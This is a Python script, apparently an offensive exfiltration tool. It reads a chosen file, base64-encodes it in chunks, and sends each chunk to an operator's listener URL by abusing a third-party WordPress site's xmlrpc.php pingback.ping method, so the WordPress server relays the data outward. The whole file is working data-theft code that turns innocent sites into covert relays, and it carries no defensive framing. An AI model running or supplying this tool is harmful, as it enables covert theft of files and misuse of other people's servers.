import argparse, base64, urllib.request

#
# Global Variables
#
args = None
BLOG_PAGE     = "?p=1"
LISTENER_URL  = ""
WORDPRESS_URL = ""


def encode_contents( contents ):
    _base64 = None

    if type( contents ) == str:
        _base64 = base64.b64encode( contents.encode("utf-8") ).decode("utf-8")

    if type( contents ) == bytes:
        _base64 = base64.b64encode( contents ).decode("utf-8")

    return _base64

def chunk( details, data ) -> list:
    _base64 = ""
    dataset = []
    chunks  = []
    chunk_size = 4000 if not args.chunksize else args.chunksize

    # Small file    
    if len( data ) < chunk_size:
        _base64 = encode_contents( data )
        details[ "data" ]   = _base64
        details[ "length" ] = len( _base64 )
        return [ base64.b64encode( str( details ).encode("utf-8") ).decode("utf-8") ]
    
    dataset = [ data[i:i + chunk_size] for i in range(0, len(data), chunk_size) ]
    for datapoint in dataset:
        encoded_data = encode_contents( datapoint ).replace( "/", "%99" ).replace( "+", "%2B" )
        details[ "data" ]   = encoded_data
        details[ "length" ] = len( encoded_data )
        chunks.append( base64.b64encode( str( details ).encode("utf-8") ).decode("utf-8") )

    return chunks


def send( message ):
    global BLOG_PAGE
    global WORDPRESS_URL
    
    xml = ""
    request = None
    
    if args.blog != None:
        BLOG_PAGE = args.blog

    try:
        xml = generate_xml( 
            "pingback.ping", [ 
                { "type" : "string", "value" : LISTENER_URL + message }, 
                { "type" : "string", "value" : f"{ WORDPRESS_URL }/{ BLOG_PAGE }"}
            ]
        )

    except Exception as e:
        print( e )
        return False

    if xml == "": return False

    # Send 
    try:
        request = urllib.request.Request(WORDPRESS_URL + "xmlrpc.php", data=xml.encode('utf-8'), headers={'Content-Type': 'application/xml'})
                    
    except Exception as e:
        
        if "https" in WORDPRESS_URL:
            # SSL likely not supported.

            WORDPRESS_URL = WORDPRESS_URL.replace( "https", "http" )
            return send( message ) 
            
        # URL likely wrong.
        return False
    
    # Error in request.
    with urllib.request.urlopen(request) as response:
        if response.getcode() != 200 and response.getcode() != "200":
            return False

    return True
    

def generate_xml( methodName, params=[] ) -> str:
    parameters = ""
    for parameter in params:
        p_type = parameter[ "type" ]
        p_value = parameter[ "value" ] 

        _param = f"""
        <param>
            <value>
                <{ p_type }>{ p_value }</{ p_type }>
            </value>
        </param>
        """
        parameters += _param
            
    body = f"""
    <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
            <methodName>{ methodName }</methodName>
            <params>
                { parameters }
            </params>
        </methodCall>
    """

    return body


def read( file_path ):
    data = ""

    with open( file_path, "rb" ) as file:
        data = file.read()        

    return data


def main( filename ):
    c = 0
    success = True
    details = {
        "length" : None,
        "filename" : filename.split("/")[ -1 ] if args.name == None else args.name
    } 

    file_data = read( filename )

    chunked_data = chunk( details, file_data ) 

    if len( chunked_data ) == 1:
        return 0 if send( chunked_data[ 0 ] ) else 1

    for _chunk in chunked_data:
        success = send( _chunk )
        print( c, "/", len( chunked_data ), end="\r" ); c += 1

    return 0 if success else 1



if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    #TODO: Helper
    parser.add_argument("-f", "--file",      required=True)
    parser.add_argument("-w", "--wordpress", required=True)
    parser.add_argument("-l", "--listener",  required=True)
    parser.add_argument("-b", "--blog",      required=False)
    parser.add_argument("-n", "--name",      required=False)
    parser.add_argument("-c", "--chunksize", required=False, type=int)
    
    args = parser.parse_args()

    FILE = args.file
    LISTENER_URL  = args.listener 
    WORDPRESS_URL = args.wordpress
    
    print( main( filename= FILE ))
    